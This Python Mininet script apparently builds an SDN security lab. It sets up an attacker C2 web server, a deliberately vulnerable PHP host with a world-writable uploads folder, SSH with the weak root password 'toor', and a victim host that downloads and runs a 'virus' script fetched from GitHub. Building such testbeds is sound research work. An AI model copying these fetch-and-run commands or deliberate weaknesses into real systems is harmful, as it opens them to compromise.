from mininet.net import Mininet
from mininet.node import Controller, OVSSwitch
from mininet.link import TCLink
from mininet.cli import CLI
from mininet.log import setLogLevel


def create_network():
    # Create a network
    net = Mininet(controller=Controller, link=TCLink, switch=OVSSwitch)

    # Add a controller
    net.addController('c0')

    # Add switches
    s1 = net.addSwitch('s1')
    s2 = net.addSwitch('s2')
    s3 = net.addSwitch('s3')

    # Add hosts and links to s1
    h1 = net.addHost('h1', ip='10.42.0.1')
    h2 = net.addHost('h2', ip='10.42.0.2')
    net.addLink(h1, s1, bw=200)
    net.addLink(h2, s1, bw=100)

    # Add hosts and links to s2
    h3 = net.addHost('h3', ip='10.42.0.3')
    h4 = net.addHost('h4', ip='10.42.0.4')
    net.addLink(h3, s2, bw=100)
    net.addLink(h4, s2, bw=100)

    # Add hosts and links to s3
    h5 = net.addHost('h5', ip='10.42.0.5')
    h6 = net.addHost('h6', ip='10.42.0.6')
    net.addLink(h5, s3, bw=100)
    net.addLink(h6, s3, bw=100)

    # Add links between switches
    net.addLink(s1, s2, bw=1000)
    net.addLink(s2, s3, bw=1000)

    # Start the network
    net.start()

    # Install a simple webserver on h5 (attacker node (C2 Server))
    h5.cmd('apt-get update && apt-get install -y apache2')
    h5.cmd('service apache2 start')
    # Create a command file
    h5.cmd('echo "ls" > /var/www/html/command')

    # Install php and apache on h2
    h2.cmd('apt-get update && apt-get install -y apache2 php')
    # Start apache
    h2.cmd('service apache2 start')
    # Download the vulnerable web application
    h2.cmd('rm /var/www/html/index.html')
    h2.cmd('wget https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/vuln-webserver.html -O /var/www/html/index.html')
    # Allow uploads
    h2.cmd('mkdir /var/www/html/uploads && chmod 777 /var/www/html/uploads')

    # Enable SSH on h5
    h5.cmd('apt-get update')
    h5.cmd('apt-get install -y openssh-server')
    # Set a weak password for root (toor)
    h5.cmd('echo "root:toor" | chpasswd')

    # Simulate phishing on h4
    h4.cmd('wget https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/simple-virus.py -O virus.py')
    h4.cmd('python virus.py &')


if __name__ == '__main__':
    setLogLevel('info')
    create_network()